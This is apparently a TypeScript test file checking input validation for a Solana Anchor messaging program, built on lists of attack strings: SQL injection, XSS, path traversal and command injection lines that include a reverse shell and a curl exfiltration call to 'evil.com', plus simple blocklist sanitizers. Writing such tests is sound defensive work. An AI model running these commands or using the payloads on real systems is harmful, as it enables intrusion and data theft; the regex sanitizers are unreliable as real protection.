import { expect, test, describe, beforeAll } from "bun:test";
import * as anchor from "@coral-xyz/anchor";
import { Program, BN, AnchorProvider } from "@coral-xyz/anchor";
import { PodCom } from "../target/types/pod_com";
import {
  PublicKey,
  Keypair,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";

const provider = anchor.AnchorProvider.env();
anchor.setProvider(provider);

const program = anchor.workspace.PodCom as Program<PodCom>;

// Input validation test utilities
const ValidationTestUtils = {
  // Generate various types of malicious inputs
  getMaliciousInputs: () => ({
    // SQL injection attempts
    sqlInjection: [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM secrets --",
      "'; INSERT INTO admin (user) VALUES ('attacker'); --",
      "' AND (SELECT COUNT(*) FROM sensitive_data) > 0 --",
    ],

    // XSS payloads
    xssPayloads: [
      '<script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '<img src=x onerror=alert("XSS")>',
      '"><script>alert(document.cookie)</script>',
      '<svg onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload=alert("XSS")>',
      '<style>@import"javascript:alert(\'XSS\')"</style>',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
      '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
    ],

    // Command injection
    commandInjection: [
      '; rm -rf /',
      '&& cat /etc/passwd',
      '| whoami',
      '$(curl evil.com)',
      '`rm -rf /tmp`',
      '; nc -e /bin/sh evil.com 4444',
      '&& curl http://evil.com/$(id)',
      '|| echo "injected" > /tmp/pwned',
      '> /etc/passwd',
      '< /etc/shadow',
    ],

    // Path traversal
    pathTraversal: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '.././.././.././etc/passwd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
    ],

    // LDAP injection
    ldapInjection: [
      '*)(&',
      '*)(uid=*',
      '*)(|(uid=*',
      '*))%00',
      '*(|(password=*))',
      '*)((objectClass=*)',
    ],

    // NoSQL injection
    nosqlInjection: [
      '{"$ne": null}',
      '{"$regex": ".*"}',
      '{"$where": "function() { return true; }"}',
      '{"$gt": ""}',
      '{"$exists": true}',
    ],

    // Buffer overflow attempts
    bufferOverflow: [
      'A'.repeat(1000),
      'A'.repeat(10000),
      'A'.repeat(100000),
      '\x00'.repeat(1000),
      Buffer.alloc(65536, 'X').toString(),
      'A'.repeat(2**16),
    ],

    // Format string attacks
    formatString: [
      '%x%x%x%x%x%x%x%x',
      '%s%s%s%s%s%s%s%s',
      '%n%n%n%n%n%n%n%n',
      '%p%p%p%p%p%p%p%p',
      '%d%d%d%d%d%d%d%d',
    ],

    // Null byte injection
    nullBytes: [
      'file.txt\x00.exe',
      'config.ini\x00.bat',
      'data.json\x00malicious',
      'user\x00admin',
    ],

    // Unicode attacks
    unicodeAttacks: [
      '\u0000', // Null
      '\uFEFF', // BOM
      '\u202E', // RTL override
      '\u200B', // Zero-width space
      '\u2028', // Line separator
      '\u2029', // Paragraph separator
      '\uD800\uDC00', // Surrogate pair
      '\uFFFD', // Replacement character
    ],

    // CRLF injection
    crlfInjection: [
      'header\r\nSet-Cookie: admin=true',
      'value\r\n\r\n<script>alert("XSS")</script>',
      'data\n\rLocation: http://evil.com',
      'input\r\nContent-Length: 0\r\n\r\n',
    ],
  }),

  // Validate that input is properly sanitized
  validateSanitization: (original: string, sanitized: string): boolean => {
    const dangerousPatterns = [
      // Script tags
      /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
      // JavaScript URLs
      /javascript:/gi,
      // Event handlers
      /on\w+\s*=/gi,
      // Data URLs
      /data:text\/html/gi,
      // VBScript
      /vbscript:/gi,
      // Shell metacharacters
      /[;&|`$()]/gi,
      // SQL patterns
      /union\s+select/gi,
      /drop\s+table/gi,
      // Path traversal
      /\.\.[\/\\]/gi,
    ];
    
    return !dangerousPatterns.some(pattern => pattern.test(sanitized));
  },

  // Generate edge case inputs
  getEdgeCases: () => ({
    emptyValues: ['', null, undefined],
    extremeLengths: ['A', 'A'.repeat(10000), 'A'.repeat(100000)],
    numericEdges: [0, -1, Number.MAX_SAFE_INTEGER, Number.MIN_SAFE_INTEGER, NaN, Infinity, -Infinity],
    specialChars: ['<>&"\'', '\n\r\t', '\x00\x01\x02', '🚀💀👻', '中文测试'],
  }),
};

describe("Comprehensive Input Validation Tests", () => {
  let testKeypair: Keypair;
  let agentPDA: PublicKey;

  beforeAll(async () => {
    testKeypair = Keypair.generate();
    
    // Airdrop SOL for testing
    try {
      await provider.connection.requestAirdrop(
        testKeypair.publicKey,
        2 * LAMPORTS_PER_SOL
      );
      await new Promise(resolve => setTimeout(resolve, 2000));
    } catch (error) {
      console.warn("Failed to airdrop SOL for testing");
    }

    [agentPDA] = PublicKey.findProgramAddressSync(
      [Buffer.from("agent"), testKeypair.publicKey.toBuffer()],
      program.programId
    );
  });

  describe("Agent Registration Input Validation", () => {
    test("should reject malicious metadata URIs", async () => {
      const maliciousInputs = ValidationTestUtils.getMaliciousInputs();
      
      for (const xssPayload of maliciousInputs.xssPayloads) {
        try {
          await program.methods
            .registerAgent(new BN(1), xssPayload)
            .accounts({
              agentAccount: agentPDA,
              signer: testKeypair.publicKey,
              systemProgram: SystemProgram.programId,
            })
            .signers([testKeypair])
            .simulate();
          
          // Should not reach here if properly validated
          expect(false).toBe(true);
        } catch (error) {
          // Should properly reject malicious input
          expect(error.toString()).toContain("InvalidMetadataUriLength");
        }
      }
    });

    test("should handle buffer overflow attempts in metadata", async () => {
      const maliciousInputs = ValidationTestUtils.getMaliciousInputs();
      
      for (const overflow of maliciousInputs.bufferOverflow) {
        try {
          await program.methods
            .registerAgent(new BN(1), overflow.substring(0, 500)) // Truncate for test
            .accounts({
              agentAccount: agentPDA,
              signer: testKeypair.publicKey,
              systemProgram: SystemProgram.programId,
            })
            .signers([testKeypair])
            .simulate();
        } catch (error) {
          // Should handle gracefully without crashing
          expect(error.toString()).not.toContain("panic");
          expect(error.toString()).not.toContain("overflow");
        }
      }
    });

    test("should validate URL format properly", async () => {
      const invalidUrls = [
        'not-a-url',
        'ftp://invalid.com',
        'file:///etc/passwd',
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        '',
        ' ',
        'http://',
        'https://',
      ];

      for (const url of invalidUrls) {
        try {
          await program.methods
            .registerAgent(new BN(1), url)
            .accounts({
              agentAccount: agentPDA,
              signer: testKeypair.publicKey,
              systemProgram: SystemProgram.programId,
            })
            .signers([testKeypair])
            .simulate();
        } catch (error) {
          // Should reject invalid URLs
          expect(error.toString()).toContain("InvalidMetadataUriLength");
        }
      }
    });
  });

  describe("Message Content Validation", () => {
    test("should sanitize message content properly", async () => {
      const maliciousInputs = ValidationTestUtils.getMaliciousInputs();
      
      // Test XSS in message content
      for (const xss of maliciousInputs.xssPayloads) {
        const sanitized = sanitizeMessageContent(xss);
        expect(ValidationTestUtils.validateSanitization(xss, sanitized)).toBe(true);
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror');
      }
    });

    test("should handle unicode edge cases", async () => {
      const maliciousInputs = ValidationTestUtils.getMaliciousInputs();
      
      for (const unicode of maliciousInputs.unicodeAttacks) {
        const sanitized = sanitizeMessageContent(unicode);
        // Should not contain dangerous unicode characters
        expect(sanitized).not.toContain('\u0000');
        expect(sanitized).not.toContain('\u202E');
      }
    });

    test("should prevent CRLF injection", async () => {
      const maliciousInputs = ValidationTestUtils.getMaliciousInputs();
      
      for (const crlf of maliciousInputs.crlfInjection) {
        const sanitized = sanitizeMessageContent(crlf);
        expect(sanitized).not.toContain('\r\n');
        expect(sanitized).not.toContain('\n\r');
      }
    });
  });

  describe("Channel Name Validation", () => {
    test("should reject dangerous channel names", async () => {
      const dangerousNames = [
        '../admin',
        'channel\x00hack',
        'name<script>alert("xss")</script>',
        'ch\r\nannel',
        'name; DROP TABLE channels;',
        '../../etc/passwd',
      ];

      for (const name of dangerousNames) {
        const sanitized = sanitizeChannelName(name);
        expect(ValidationTestUtils.validateSanitization(name, sanitized)).toBe(true);
      }
    });

    test("should enforce length limits", async () => {
      const longName = 'A'.repeat(1000);
      const sanitized = sanitizeChannelName(longName);
      expect(sanitized.length).toBeLessThanOrEqual(50); // Assuming 50 char limit
    });
  });

  describe("Wallet Address Validation", () => {
    test("should reject invalid wallet addresses", async () => {
      const invalidAddresses = [
        '',
        'short',
        'toolongaddressthatexceedsmaximumlength1234567890',
        'invalid!@#$%^&*()',
        '0x1234567890abcdef', // Ethereum address
        'bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4', // Bitcoin address
        '\x00\x01\x02', // Null bytes
      ];

      for (const addr of invalidAddresses) {
        const isValid = validateSolanaAddress(addr);
        expect(isValid).toBe(false);
      }
    });

    test("should accept valid Solana addresses", async () => {
      const validAddresses = [
        'HEpGLgYsE1kP8aoYKyLFc3JVVrofS7T4zEA6fWBJsZps',
        '11111111111111111111111111111112', // System program
        'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA', // Token program
      ];

      for (const addr of validAddresses) {
        const isValid = validateSolanaAddress(addr);
        expect(isValid).toBe(true);
      }
    });
  });

  describe("Numeric Input Validation", () => {
    test("should handle integer overflow/underflow", async () => {
      const edgeCases = ValidationTestUtils.getEdgeCases();
      
      for (const num of edgeCases.numericEdges) {
        const validated = validateNumericInput(num);
        expect(validated).not.toBe(NaN);
        expect(validated).not.toBe(Infinity);
        expect(validated).not.toBe(-Infinity);
      }
    });

    test("should reject negative values where inappropriate", async () => {
      const negativeValues = [-1, -100, Number.MIN_SAFE_INTEGER];
      
      for (const val of negativeValues) {
        const validated = validatePositiveInteger(val);
        expect(validated).toBeGreaterThanOrEqual(0);
      }
    });
  });

  describe("File Path Validation", () => {
    test("should prevent path traversal", async () => {
      const maliciousInputs = ValidationTestUtils.getMaliciousInputs();
      
      for (const path of maliciousInputs.pathTraversal) {
        const sanitized = sanitizeFilePath(path);
        expect(sanitized).not.toContain('../');
        expect(sanitized).not.toContain('..\\');
        expect(sanitized).not.toContain('%2e%2e');
      }
    });
  });

  describe("JSON Input Validation", () => {
    test("should prevent prototype pollution", async () => {
      const maliciousJson = [
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"polluted": true}}}',
        '{"toString": "malicious"}',
      ];

      for (const json of maliciousJson) {
        try {
          const parsed = JSON.parse(json);
          const isSafe = validateJsonSafety(parsed);
          expect(isSafe).toBe(false);
        } catch (error) {
          // Should reject malicious JSON
          expect(error).toBeInstanceOf(SyntaxError);
        }
      }
    });
  });
});

// Helper functions for input validation
function sanitizeMessageContent(content: string): string {
  if (typeof content !== 'string') return '';
  
  return content
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
    .replace(/javascript:/gi, '')
    .replace(/on\w+\s*=/gi, '')
    .replace(/data:text\/html/gi, '')
    .replace(/\r\n|\n\r|\r|\n/g, ' ')
    .replace(/\x00/g, '')
    .replace(/[\u202E\u200B\u2028\u2029]/g, '')
    .trim()
    .substring(0, 1000); // Length limit
}

function sanitizeChannelName(name: string): string {
  if (typeof name !== 'string') return '';
  
  return name
    .replace(/[<>&"']/g, '')
    .replace(/[;\|\&\$\(\)]/g, '')
    .replace(/\.\./g, '')
    .replace(/[\/\\]/g, '')
    .replace(/\x00/g, '')
    .trim()
    .substring(0, 50);
}

function validateSolanaAddress(address: string): boolean {
  if (typeof address !== 'string') return false;
  if (address.length < 32 || address.length > 44) return false;
  
  // Base58 validation
  const base58Regex = /^[1-9A-HJ-NP-Za-km-z]+$/;
  return base58Regex.test(address);
}

function validateNumericInput(input: any): number {
  const num = Number(input);
  if (isNaN(num) || !isFinite(num)) return 0;
  if (num > Number.MAX_SAFE_INTEGER) return Number.MAX_SAFE_INTEGER;
  if (num < Number.MIN_SAFE_INTEGER) return Number.MIN_SAFE_INTEGER;
  return Math.floor(num);
}

function validatePositiveInteger(input: any): number {
  const num = validateNumericInput(input);
  return Math.max(0, num);
}

function sanitizeFilePath(path: string): string {
  if (typeof path !== 'string') return '';
  
  return path
    .replace(/\.\./g, '')
    .replace(/[\\\/]/g, '')
    .replace(/%2e%2e/gi, '')
    .replace(/%2f/gi, '')
    .replace(/%5c/gi, '')
    .replace(/\x00/g, '')
    .trim();
}

function validateJsonSafety(obj: any): boolean {
  if (obj === null || typeof obj !== 'object') return true;
  
  const dangerousKeys = ['__proto__', 'constructor', 'prototype', 'toString', 'valueOf'];
  
  for (const key of Object.keys(obj)) {
    if (dangerousKeys.includes(key)) return false;
    if (typeof obj[key] === 'object' && !validateJsonSafety(obj[key])) return false;
  }
  
  return true;
}

describe("Input Validation Tests", () => {
  test("should sanitize XSS inputs", () => {
    const xssInput = '<script>alert("xss")</script>';
    const sanitized = sanitizeInput(xssInput);
    expect(sanitized).not.toContain('<script');
  });
});

function sanitizeInput(input: string): string {
  return input.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
} 